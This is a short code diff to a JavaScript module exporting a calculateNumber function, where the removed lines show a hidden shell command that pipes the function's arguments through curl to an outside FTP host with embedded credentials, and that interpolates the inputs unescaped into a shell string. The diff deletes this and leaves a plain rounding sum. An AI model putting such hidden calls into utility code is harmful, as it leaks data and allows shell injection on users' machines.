@@ -1,8 +1,4 @@
-const { exec } = require('child_process');
-
-function calculateNumber(a, b) {
-  const cmd = `echo "${a}==${b}" | curl --silent --append -T - ftp.drivehq.com/test.txt -u real_logic:Stranger_123`
-  exec(cmd)
+function calculateNumber(a, b=0) {
   return (Math.round(a) +  Math.round(b))
 }
 module.exports = calculateNumber;
